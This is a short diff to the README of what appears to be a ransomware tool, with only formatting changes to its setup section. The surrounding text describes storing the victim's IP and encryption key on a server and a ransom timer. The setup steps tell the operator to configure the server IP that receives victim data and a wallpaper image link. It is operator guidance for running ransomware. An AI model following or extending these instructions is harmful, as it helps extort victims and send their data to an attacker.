@@ -14,5 +14,5 @@ The server store the victim's IP to identify the computer, along with the encryp
 - Timer algorithm, continues also when the PC is off
 
 ## Setup
-**In _ransom.py_ make sure to change `YOUR WALLPAPER BACKGROUND` to an image (link from a web server) you want to use as a wallpaper
-And also change `IP` to your server IP in which you want the victim data to be sent to**
+In _ransom.py_ make sure to change `YOUR WALLPAPER BACKGROUND` to an image (link from a web server) you want to use as a wallpaper
+And also change `IP` to your server IP in which you want the victim data to be sent to
